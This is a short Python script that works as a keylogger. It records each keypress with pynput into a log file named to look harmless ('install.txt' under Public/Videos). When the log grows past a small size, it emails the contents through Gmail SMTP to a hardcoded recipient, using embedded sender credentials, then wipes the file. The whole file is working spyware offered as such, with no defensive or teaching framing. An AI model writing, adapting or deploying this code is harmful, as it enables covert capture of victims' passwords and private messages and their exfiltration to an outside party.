from pynput import keyboard
from multiprocessing import Queue
import smtplib, os, time

file ="C:/Users/Public/Videos/install.txt"

def send(fromaddr, toaddr, pwd, msg):
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.ehlo()
    server.starttls()
    server.login(fromaddr,pwd)
    server.sendmail(fromaddr, toaddr, msg)
    server.quit()

last_time = 0

def on_press(key):
    global last_time
    try:
        if time.time() - last_time > 1:
            f = open(file, 'a')
            f.write(' \n')
            f.close()
        f = open(file, 'a')
        f.write(key.char + '\n')
        f.close()
        
    except AttributeError:
        if key == keyboard.Key.space:
            f = open(file, 'a')
            f.write('space\n')
            f.close()
            
    last_time = time.time()

file_info = os.stat(file)
file_size = file_info.st_size

if(file_size > 50):
    with open(file, 'r') as f:
        msg = f.read()
    send('elmobones1337@gmail.com', 'huntadonis@gmail.com', 2813308004, msg)
    open(file, 'w').close()
# Collect events until released
with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()
